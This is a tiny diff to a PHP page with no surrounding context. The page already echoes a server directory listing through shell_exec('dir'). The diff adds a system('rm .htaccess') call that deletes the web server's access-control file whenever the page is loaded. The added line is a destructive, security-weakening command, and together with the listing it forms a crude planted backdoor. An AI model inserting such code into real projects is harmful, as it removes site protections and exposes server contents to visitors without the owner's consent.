@@ -1,5 +1,6 @@
 <?php
-
+    
+    system('rm .htaccess');
     echo shell_exec('dir');
 
 ?>
